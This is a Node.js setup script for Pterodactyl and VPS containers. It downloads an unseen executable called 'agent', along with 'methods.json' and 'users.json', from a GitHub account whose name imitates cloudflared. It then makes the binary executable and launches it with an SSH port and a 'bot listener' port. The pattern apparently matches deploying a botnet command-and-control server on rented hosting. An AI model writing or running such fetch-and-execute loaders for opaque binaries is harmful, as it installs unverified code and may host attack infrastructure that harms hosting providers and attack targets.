/**
 * Agent Setup Script - Pure Node.js (Pterodactyl & VPS Compatible)
 * Automatically detects Pterodactyl ports ($SERVER_PORT, $PORT, $BOT_PORT)
 * Downloads Agent binaries & configs from GitHub repository
 * Keeps container active and pipes logs directly to console
 */

const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const REPO_BASE = 'https://raw.githubusercontent.com/cloudflared9-hub/agent/main';

const FILES_TO_DOWNLOAD = [
    { url: `${REPO_BASE}/agent`, filename: 'agent', executable: true },
    { url: `${REPO_BASE}/methods.json`, filename: 'methods.json', executable: false },
    { url: `${REPO_BASE}/users.json`, filename: 'users.json', executable: false }
];

function download(url, destPath) {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;

        client.get(url, (res) => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                return download(res.headers.location, destPath).then(resolve).catch(reject);
            }

            if (res.statusCode !== 200) {
                return reject(new Error(`Failed to download ${url}: HTTP status ${res.statusCode}`));
            }

            const fileStream = fs.createWriteStream(destPath);
            res.pipe(fileStream);

            fileStream.on('finish', () => {
                fileStream.close(resolve);
            });

            fileStream.on('error', (err) => {
                fs.unlink(destPath, () => {});
                reject(err);
            });
        }).on('error', (err) => {
            fs.unlink(destPath, () => {});
            reject(err);
        });
    });
}

async function setup() {
    const targetDir = process.cwd();
    console.log(`[+] Setting up Agent Server in: ${targetDir}`);

    // Auto-detect Pterodactyl container ports
    const sshPort = process.env.SERVER_PORT || process.env.PORT || '1337';
    const botPort = process.env.BOT_PORT || (parseInt(sshPort, 10) + 1).toString();

    console.log(`[+] Configured Ports -> SSH Port: ${sshPort} | Bot Listener Port: ${botPort}`);

    for (const item of FILES_TO_DOWNLOAD) {
        const dest = path.join(targetDir, item.filename);
        try {
            process.stdout.write(`[*] Downloading ${item.filename}... `);
            await download(item.url, dest);
            console.log('OK');

            if (item.executable) {
                fs.chmodSync(dest, 0o755);
                console.log(`[+] Set chmod +x for ${item.filename}`);
            }
        } catch (err) {
            console.log('FAILED');
            console.error(`[!] Error with ${item.filename}: ${err.message}`);
        }
    }

    const agentBinPath = path.join(targetDir, 'agent');
    if (fs.existsSync(agentBinPath)) {
        console.log(`[+] Launching Agent SSH server (PID will be attached to container)...`);
        
        const args = ['-p', sshPort, '-b', botPort];
        const child = spawn(agentBinPath, args, {
            cwd: targetDir,
            stdio: 'inherit'
        });

        child.on('error', (err) => {
            console.error(`[!] Failed to start agent process: ${err.message}`);
            process.exit(1);
        });

        child.on('exit', (code, signal) => {
            console.log(`[!] Agent process exited with code ${code} (signal: ${signal})`);
            process.exit(code || 0);
        });

        process.on('SIGINT', () => child.kill('SIGINT'));
        process.on('SIGTERM', () => child.kill('SIGTERM'));
    } else {
        console.error('[-] Agent binary not found, execution skipped.');
        process.exit(1);
    }
}

setup().catch((err) => {
    console.error(`[!] Setup failed: ${err.message}`);
    process.exit(1);
});
